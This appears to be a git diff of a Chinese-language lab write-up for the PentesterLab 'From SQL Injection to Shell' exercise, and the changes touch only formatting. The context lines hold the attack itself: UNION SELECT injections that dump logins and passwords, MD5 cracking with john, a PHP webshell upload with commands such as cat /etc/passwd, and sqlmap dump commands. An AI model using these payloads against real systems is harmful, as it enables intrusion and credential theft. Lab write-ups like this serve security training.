@@ -44,7 +44,7 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10
 ![](https://i.imgur.com/zsujKzR.png)
 
 - SQL注入
-	-查看网页源码，发现有3个id值，可以返回三张图片 
+	- 查看网页源码，发现有3个id值，可以返回三张图片 
 ![](https://i.imgur.com/SU66Cj6.png)
 ![](https://i.imgur.com/cSJtC45.png)
 当id为3时，应该返回内容，但可能因为该图片已经不存在因此返回空白
@@ -61,7 +61,7 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10
 
 可见该结果满足理论上and和or的判断条件
 
-	- 服务器接受减法运算，加法符号会报错，同时会暴露后台数据库是MYSQL
+- 服务器接受减法运算，加法符号会报错，同时会暴露后台数据库是MYSQL
 ![](https://i.imgur.com/6acUWST.png)
 	- 服务器接受求余运算1%2=1,2%1=0，按照运算结果返回内容
 ![](https://i.imgur.com/Cv03YMm.png)
@@ -73,7 +73,8 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10
 	- 被引号引起来的数字会被服务器正确解释并返回，但处理速度通常要慢于直接书写数字
 ![](https://i.imgur.com/KW5iCXT.png)
 由结果可见，整数与字符都可能产生SQL注入
-	- 利用order关键字来探测数据库中的列数，如果ORDER BY语句中的列号大于查询中的列数，则会引发错误；由1开始递增观察到当order 5时返回未知列数错误，确定列数为4
+	
+- 利用order关键字来探测数据库中的列数，如果ORDER BY语句中的列号大于查询中的列数，则会引发错误；由1开始递增观察到当order 5时返回未知列数错误，确定列数为4
 ![](https://i.imgur.com/fBsaNso.png)
 	- 利用UNION SELECT来确定列数，如果尝试执行UNION并且两个查询返回的列数不同，则注入返回错误；通过该过程猜测并确定列数为4
 ![](https://i.imgur.com/RIS1V9I.png)
@@ -85,7 +86,8 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10
 ```
 ![](https://i.imgur.com/9XS75EC.png)
 ![](https://i.imgur.com/TwrknFB.png)
-	- MySQL提供的表包含自MySQL版本5以来可用的数据库，表和列的元信息。我们将使用这些表来检索构建最终请求所需的信息。这些表存储在数据库information_schema中。
+	
+- MySQL提供的表包含自MySQL版本5以来可用的数据库，表和列的元信息。我们将使用这些表来检索构建最终请求所需的信息。这些表存储在数据库information_schema中。
 ```
 表格列表： http://10.0.2.8/cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
 列列表： http://10.0.2.8/cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns
@@ -96,7 +98,8 @@ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt  --hc 404 http：//10
 使用关键字CONCAT：
 在注入的同一部分中连接表名和列名:http://10.0.2.8/cat.php?id=1 UNION SELECT 1,concat('^^^',table_name,':',column_name,'^^^'),3,4 FROM information_schema.columns
 ```
-	- 我们获悉想要的用户名和密码信息在user表中，于是用如下查询得到需要的信息
+	
+- 我们获悉想要的用户名和密码信息在user表中，于是用如下查询得到需要的信息
 ```
 http://10.0.2.8/cat.php?id=1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;
 ```
@@ -119,7 +122,7 @@ john pwd.txt --format = raw-md5 --wordlist = rockyou.txt --rules
 ![](https://i.imgur.com/elsQ7Pj.png)
 
 - 上传webshell和代码执行
-我们可以看到有一个允许用户上传图片的文件上传功能，我们可以使用此功能尝试上传PHP脚本。一旦上传到服务器上，这个PHP脚本将为我们提供运行PHP代码和命令的方法。
+<br>我们可以看到有一个允许用户上传图片的文件上传功能，我们可以使用此功能尝试上传PHP脚本。一旦上传到服务器上，这个PHP脚本将为我们提供运行PHP代码和命令的方法。
 
 	- 首先，我们需要创建一个PHP脚本来运行命令。保存为扩展名为.php的文件
 ![](https://i.imgur.com/n1Wbgl6.png)
@@ -135,16 +138,16 @@ john pwd.txt --format = raw-md5 --wordlist = rockyou.txt --rules
 ![](https://i.imgur.com/UmUY35e.png)
 ![](https://i.imgur.com/QoDywIe.png)
 	- 利用url执行cmd命令获取服务器信息
-	1. 获取服务器内核信息
+	1. 获取服务器内核信息<br>
 	```http://10.0.2.8/admin/uploads/shell.php3?cmd=uname```
 	![](https://i.imgur.com/LFhe5Uk.png)
-	2. 获取系统用户完整列表
+	2. 获取系统用户完整列表<br>
 	```http://10.0.2.8/admin/uploads/shell.php3?cmd=cat /etc/passwd```
 	![](https://i.imgur.com/muNyDct.png)
-	3.  获取当前内核的版本
+	3.  获取当前内核的版本<br>
 	```http://10.0.2.8/admin/uploads/shell.php3?cmd=uname -a```
 	![](https://i.imgur.com/IpizLZM.png)
-	4. 获取当前目录的内容
+	4. 获取当前目录的内容<br>
 	```http://10.0.2.8/admin/uploads/shell.php3?cmd=ls``` 
 	![](https://i.imgur.com/eHaZJGN.png)
 
@@ -153,10 +156,10 @@ john pwd.txt --format = raw-md5 --wordlist = rockyou.txt --rules
 ![](https://i.imgur.com/q8efbOz.png)
 	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" --dbs```
 ![](https://i.imgur.com/A5OQdwd.png)
-	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" --tables```
+	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" --tables```<br>
 ![](https://i.imgur.com/uBPxAeY.png)
 ![](https://i.imgur.com/ma1iU5o.png)
-	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" -T users --columns```
+	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" -T users --columns```<br>
 ![](https://i.imgur.com/zvoRa0U.png)
 	- ```sqlmap -u "http://10.0.2.8/cat.php?id=1" -T users -C "login,password" --dump```
 ![](https://i.imgur.com/5e1TLvS.png)
@@ -164,6 +167,6 @@ john pwd.txt --format = raw-md5 --wordlist = rockyou.txt --rules
 ## 参考
 ------
 
- [SQL注入常见攻击方式](https://blog.csdn.net/github_36032947/article/details/78442189)
- [Kali下使用SQLmap工具对网站进行渗透测试检测](https://www.exehack.net/4955.html)
+ [SQL注入常见攻击方式](https://blog.csdn.net/github_36032947/article/details/78442189)<br>
+ [Kali下使用SQLmap工具对网站进行渗透测试检测](https://www.exehack.net/4955.html)<br>
  [From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/course)
